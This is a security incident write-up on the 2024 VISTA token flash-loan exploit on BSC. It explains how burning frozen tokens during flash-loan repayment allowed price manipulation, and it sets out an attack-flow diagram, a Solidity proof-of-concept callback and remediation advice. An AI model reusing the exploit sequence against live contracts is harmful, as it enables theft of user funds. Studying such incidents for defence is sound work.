# VISTA — Flash Loan Burn-Freeze Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-10-18 |
| **Protocol** | VISTA |
| **Chain** | BSC |
| **Loss** | ~29,000 USDT |
| **Attacker** | [Attacker](https://app.blocksec.com/explorer/tx/bsc/0x84c385aab658d86b64e132e8db0c092756d5a9331a1131bf05f8214d08efba56) |
| **Attack Tx** | [0x84c385aa](https://app.blocksec.com/explorer/tx/bsc/0x84c385aab658d86b64e132e8db0c092756d5a9331a1131bf05f8214d08efba56) |
| **Vulnerable Contract** | [0x493361D6](https://bscscan.com/address/0x493361D6164093936c86Dcb35Ad03b4C0D032076) |
| **Root Cause** | VISTA's burn logic burns frozen tokens during repayment, reducing AMM reserves and enabling price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/VISTA_exp.sol) |

---
## 1. Vulnerability Overview

The VISTA token's flash loan function burns tokens upon repayment regardless of their frozen status. The attacker deposited BUSD into the presale contract to acquire VISTA, borrowed VISTA via its own flash loan, and during repayment triggered the burning of frozen tokens — reducing total supply and artificially inflating the price.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable VISTA flashLoan: allows burning of frozen tokens
contract VISTAToken {
    mapping(address => bool) public frozen;

    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external {
        // Lend tokens
        _transfer(address(this), receiver, amount);

        // Execute callback
        IFlashBorrower(receiver).onFlashLoan(/* ... */);

        // Receive repayment
        _transfer(receiver, address(this), amount + fee);

        // ❌ Burns without checking frozen status
        _burn(address(this), amount);  // Frozen tokens are burned as well
    }
}

// ✅ Fix: return balance instead of burning on flash loan repayment
// Or: prevent frozen tokens from being burned
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: VISTA_decompiled.sol
contract VISTA {
    function burn(uint256 p0) external {}  // ❌ Vulnerable
```

## 3. Attack Flow

```
Attacker
  │
  ├─[1]─▶ PancakeV3 Flash Loan: borrow 1,500 USDT
  │
  ├─[2]─▶ Swap USDT → BUSD
  │
  ├─[3]─▶ presale.stake(BUSD balance, this) — acquire VISTA
  │         Deposit BUSD → receive VISTA tokens
  │
  ├─[4]─▶ VISTA.flashLoan(this, VISTA, amount, "")
  │         └─ Borrow VISTA
  │
  ├─[5]─▶ onFlashLoan callback:
  │         Sell portion of VISTA (prepare for price manipulation)
  │
  ├─[6]─▶ On flash loan repayment ❌ frozen tokens are burned
  │         Total supply decreases → VISTA price rises
  │
  ├─[7]─▶ Sell remaining VISTA → USDT at inflated price
  │
  └─[8]─▶ Repay flash loan + ~29K USDT profit
```

## 4. PoC Code

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {
    // USDT → BUSD
    swap_token_to_token(address(USDT), address(BUSD), USDT.balanceOf(address(this)));

    // Acquire VISTA (presale staking)
    BUSD.approve(presale, BUSD.balanceOf(address(this)));
    (bool success,) = presale.call(
        abi.encodeWithSignature("stake(uint256,address)", BUSD.balanceOf(address(this)) / 1e18, address(this))
    );

    // VISTA flash loan (trigger frozen token burn)
    uint256 amount = IERC20(VISTA).balanceOf(address(this));
    IERC20(VISTA).approve(address(VISTA), amount);
    (bool success1,) = VISTA.call(
        abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", address(this), VISTA, amount, "")
    );

    USDT.transfer(address(pool), borrow_amount + fee0);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Vulnerability |
| **Attack Vector** | Flash Loan Burn Mechanism |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Prevent burning of frozen tokens**: Check frozen status before burning during `flashLoan` repayment
2. **Decouple flash loan burn logic**: Design the burn functionality independently from flash loans
3. **Supply invariant protection**: Verify total supply invariant before and after flash loan execution
4. **Price manipulation detection**: Block transactions where price deviation exceeds a threshold within a single transaction

## 7. Key Takeaways

- Combining flash loans with a burn mechanism enables price manipulation through supply reduction.
- The principle that "frozen tokens" must never be burned or transferred under any circumstances must be enforced.
- The presale contract's immediate VISTA distribution provides the attacker with initial capital to execute the attack.